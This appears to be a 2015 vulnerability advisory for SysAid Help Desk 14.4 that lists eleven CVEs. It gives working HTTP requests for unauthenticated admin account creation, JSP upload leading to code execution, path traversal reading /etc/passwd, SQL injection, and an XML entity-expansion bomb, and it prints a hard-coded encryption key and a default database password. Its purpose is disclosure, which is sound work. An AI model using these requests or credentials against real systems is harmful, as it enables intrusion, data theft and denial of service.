@@ -1,0 +1,232 @@
+>> Multiple vulnerabilities in SysAid Help Desk 14.4
+>> Discovered by Pedro Ribeiro (pedrib@gmail.com), Agile Information Security
+=================================================================================
+Disclosure: 03/06/2015 / Last updated: 10/06/2015
+
+>> Background on the affected product:
+"SysAid is an ITSM solution that offers all the essentials, with everything you need for easy and efficient IT support and effective help desk operations. Its rich set of features includes a powerful service desk, asset management and discovery, self-service, and easy-to-use tools for understanding and optimizing IT performance."
+
+Metasploit modules that exploit #1, #2, #3, #4, #5 and #6 have been released and should be integrated in the Metasploit framework soon.
+All vulnerabilities affect both the Windows and Linux versions unless otherwise noted.
+
+
+>> Technical details:
+1)
+Vulnerability: Administrator account creation
+CVE-2015-2993 (same CVE as #10)
+Constraints: none; no authentication or any other information needed
+Affected versions: unknown, at least 14.4
+
+GET /sysaid/createnewaccount?accountID=1337&organizationName=sysaid&userName=mr_lit&password=secret&masterPassword=master123
+
+This creates an account with the following credentials: mr_lit:secret
+Note that this vulnerability only seems to be exploitable ONCE! Subsequent attempts to exploit it will fail even if the tomcat server is restarted.
+
+
+2)
+Vulnerability: File upload via directory traversal (authenticated; leading to remote code execution)
+CVE-2015-2994
+Constraints: valid administrator account needed (see #1 to create a valid admin account)
+Affected versions: unknown, at least 14.4
+
+
+POST /sysaid/ChangePhoto.jsp?isUpload=true HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------------81351919525780
+
+-----------------------------81351919525780
+Content-Disposition: form-data; name="activation"; filename="whatevs.jsp"
+Content-Type: application/octet-stream
+
+<html><body><%out.println(System.getProperty("os.name"));%></body><html>
+-----------------------------81351919525780--
+
+
+The response returns a page which contains the following:
+        var imageUrl = "icons/user_photo/14222767515000.1049804910604456_temp.jsp?1422276751501";
+        var thumbUrl = "icons/user_photo/14222767515000.1049804910604456_temp_thumb.jsp?1422276751501";
+        if(imageUrl != null && $.trim(imageUrl).length > 0)
+        {
+            document.getElementById("cropbox").src = imageUrl;
+            document.getElementById("preview").src = thumbUrl;
+            parent.glSelectedImageUrl = "icons/user_photo/14222767515000.1049804910604456_temp.jsp";
+            
+Go to http://<server>/sysaid/icons/user_photo/14222767515000.1049804910604456_temp.jsp to execute the JSP.
+
+
+3)
+Vulnerability: File upload via directory traversal (unauthenticated; leading to remote code execution)
+CVE-2015-2995
+Constraints: no authentication or any other information needed. The server has to be running Java 7u25 or lower. This is because Java 7u40 (FINALLY!) rejects NULL bytes in file paths. See http://bugs.java.com/bugdatabase/view_bug.do?bug_id=8014846 for more details.
+Affected versions: unknown, at least 14.3 and 14.4
+
+POST /sysaid/rdslogs?rdsName=../../../../sample.war%00
+<... WAR payload here ...>
+
+
+4)
+Vulnerability: Arbitrary file download
+CVE-2015-2996 (same CVE as #8)
+Constraints: none; no authentication or any other information needed (see #5 to obtain the traversal path)
+Affected versions: unknown, at least 14.4
+
+GET /sysaid/getGfiUpgradeFile?fileName=../../../../../../../etc/passwd
+
+
+5)
+Vulnerability: Path disclosure
+CVE-2015-2997
+Constraints: none; no authentication or any other information needed
+Affected versions: unknown, at least 14.4; only works on the Linux version
+
+POST /sysaid/getAgentLogFile?accountId=<traversal>&computerId=<junk characters>
+
+Metasploit PoC:
+
+    large_traversal = '../' * rand(15...30)
+    servlet_path = 'getAgentLogFile'
+    
+    res = send_request_cgi({
+      'uri' => normalize_uri(datastore['TARGETURI'], servlet_path),
+      'method' => 'POST',
+      'data' => Zlib::Deflate.deflate(Rex::Text.rand_text_alphanumeric(rand(100) + rand(300))),
+      'ctype' => 'application/octet-stream',
+      'vars_get' => {
+        'accountId' => large_traversal + Rex::Text.rand_text_alphanumeric(8 + rand(10)),
+        'computerId' => Rex::Text.rand_text_alphanumeric(8 + rand(10))
+      }
+    })
+    
+The response (res.body.to_s) will be similar to:
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML>
+<HEAD><TITLE>Error</TITLE></HEAD>
+<BODY>
+<H1>Internal Error No#14</H1>
+<H2>/var/lib/tomcat7/webapps/sysaid/./WEB-INF/agentLogs/../../../../../../../../../../bla.war/111.war/1421678611732.zip (Permission denied)</H2>
+</BODY></HTML>
+
+The tomcat path is revealed between the H2 tags.
+
+
+6)
+Vulnerability: Use of hard-coded cryptographic key
+CVE-2015-2998
+Constraints: N/A
+Affected versions: unknown, at least 14.4
+
+SysAid Help Desk uses a hard-coded encryption key and encryption parameters. If this is combined with an arbitrary file download vulnerability (such as #4), a malicious user can then decrypt the database password by downloading the WEB-INF/conf/serverConf.xml file.
+Algorithm: DES password based encryption with MD5 hash
+Key: "inigomontoya"
+Salt: [-87, -101, -56, 50, 86, 53, -29, 3]
+Iterations: 19
+
+
+7)
+Vulnerability: SQL injection in genericreport, HelpDesk.jsp and RFCGantt.jsp
+CVE-2015-2999
+Constraints: valid administrator account needed
+Affected versions: unknown, at least 14.4
+
+a)
+POST /sysaid/genericreport HTTP/1.1
+action=execute&reportName=AssetDetails&scheduleReportParm=null&reportTitle=Asset+Details&company=0&filter=group&groupFilter='&assetID=&assetName=Click+Browse+to+choose&expressionCaption=&customExpression=&customSQL=&outFormat=PDF&userName1=admin&viewNow=checkbox&scheduleStart=26-01-2015+06%3A27&reRunEvery=2&user1=admin
+
+action=execute&reportName=TopAdministratorsByAverageTimer&scheduleReportParm=null&reportTitle=Administrators+with+the+longest+SRs+time+%28average%29&sr_types=1&company=0&timer=1&expressionCaption=&customExpression=&customSQL=select+*+from+bla&DatePeriod=1&fromDate=26-12-2014&toDate=27-01-2015&NumRecords=5&outFormat=PDF&userName1=admin&viewNow=checkbox&scheduleStart=26-01-2015+07%3A03&reRunEvery=2&user1=admin&groupingSelection=Administrator&groupingSelectionName=Administrators&subGroupingSelection=AverageTimer&Activity=no
+
+action=execute&reportName=ActiveRequests&scheduleReportParm=null&assetID=&reportTitle=Active+Records&category=000ALL&subcategory=000ALL&thirdLevelCategory=000ALL&sr_types=1&company=0&groupFilter=ALL&expressionCaption=&customExpression=&customSQL='&groupingSelection=Category&DatePeriod=1&fromDate=26-12-2014&toDate=27-01-2015&outFormat=PDF&userName1=admin&viewNow=checkbox&scheduleStart=26-01-2015+07%3A08&reRunEvery=2&user1=admin
+
+Parameters:
+groupFilter
+customSQL
+
+(3 sample payloads are shown - the reportName has to be valid and each reportName expects different parameters)
+
+
+b)
+POST /sysaid/HelpDesk.jsp?helpdeskfrm&fromId=List&ajaxStyleList=YE
+resizeListViewDataArr=AccordionChange&fieldNameChangeState=&tabID=42&actionInfo=&builtFilter=&weightChangeNoAjax=&sort=r.id&dir=asc'&pageNo=1&showAll=0&toggleAll=0&isAccordion=0&calSearch=0&expandAll=0&action=&performAction=&${list.SrTypeFilter}hidden=&${list.category.caption}hidden=&${list.subCategory.caption}hidden=&${list.status.caption}hidden=&${list.requestUser.caption}hidden=&${list.assigned.to.caption}hidden=&${list.priority.caption}hidden=&selection=&selectionDisplay=&saveSelection=1&searchField=Search%20%20%20&dateType=&fromDate=&toDate=&ajaxShown=&multipleSelectionComboboxSet=SetMultipleSelectionCombobox&multipleSelectionComboboxStatus=&multipleSelectionComboboxPriority=&multipleSelectionComboboxAssignedTo=
+
+Parameter:
+dir
+
+
+c)
+POST /sysaid/RFCGantt.jsp HTTP/1.1
+listName=Service+Requests+All&toInvalid=%27To+date%27+field+contains+an+invalid+value%21&fromInvalid=%27From+date%27+field+contains+an+invalid+value%21&listViewName=DEFAULT&ids=&flag=HelpDesk.jsp%3Fhelpdeskfrm%26fromId%3DList&page=HelpDesk.jsp%3Fhelpdeskfrm%26fromId%3DList&parentPageName=HelpDesk.jsp%3Fhelpdeskfrm%26fromId%3DList&computerID=null&ciId=null&returnToFunction=&srType=&ganttSQL=$select+*+from+ble;$SELECT+r.id,+r.sr_type,+r.account_id,+priority,+escalation,+status,+r.request_user,r.due_date,r.title,r.problem_type,r.problem_sub_type,r.sr_type,r.sr_weight,r.responsibility,r.responsible_manager,r.assigned_group+,+r.id,+r.id,+r.sr_type,+r.problem_type,r.problem_sub_type,r.third_level_category,+r.problem_sub_type,+r.title,+r.status,+r.request_user,+r.responsibility,+r.priority,+r.insert_time+from+service_req+r+++WHERE+r.account_id+%3d+%3f&lookupListName=&scrollPopup=NO&iframeID=null&paneCancelFunc=&filter=+AND+%28archive+%3D+0%29+&fromDate=null&toDate=null&isWeight=true
+
+Accepts injection between $$ in ganttSQL parameter.
+
+
+8)
+Vulnerability: Denial of service
+CVE-2015-2996 (same CVE as #4)
+Constraints: no authentication or any other information needed 
+Affected versions: unknown, at least 14.4
+
+GET /sysaid/calculateRdsFileChecksum?fileName=../../../../../../dev/zero
+
+This request will cause the cpu to go to 100% and the memory to balloon for 30+ seconds. Sending lots of requests causes the server to slow down to a crawl (although it doesn't seem to crash or hang forever).
+
+
+9)
+Vulnerability: XML Entity Expansion (leading to denial of service)
+CVE-2015-3000
+Constraints: no authentication or any other information needed
+Affected versions: unknown, at least 14.4
+
+a)
+POST /sysaid/agententry?deflate=0
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+ <!ENTITY lol "lol">
+ <!ELEMENT lolz (#PCDATA)>
+ <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+ <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+ <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+ <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+ <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+ <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+ <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+ <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+ <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lolz>&lol9;</lolz>
+
+b)
+POST /sysaid/rdsmonitoringresponse
+<lol bomb in POST data>
+
+c)
+POST /sysaid/androidactions
+<lol bomb in POST data>
+
+These requests will cause the cpu to go to 100% and the memory to baloon for 10+ seconds. Sending lots of requests causes the server to slow down to a crawl (although it doesn't seem to crash or hang forever).
+
+
+10)
+Vulnerability: Uncontrolled file overwrite
+CVE-2015-2993 (same CVE as #1)
+Constraints: no authentication or any other information needed
+Affected versions: unknown, at least 14.4
+
+GET /sysaid/userentry?accountId=1337&rdsName=bla&fileName=../../../service.htm
+
+This will overwrite the file with "SysAid". This string is fixed and cannot be controlled by the attacker.
+
+
+11)
+Vulnerability: Use of hard-coded password for the SQL Server Express administrator account
+CVE-2015-3001
+Constraints: N/A
+Affected versions: unknown, at least 14.4
+
+When installing SysAid on Windows with the built in SQL Server Express, the installer sets the sa user password to "Password1".
+
+
+>> Fix: 
+Upgrade to version 15.2 or higher.
+
+================
+Agile Information Security Limited
+http://www.agileinfosec.co.uk/
+>> Enabling secure digital business >>
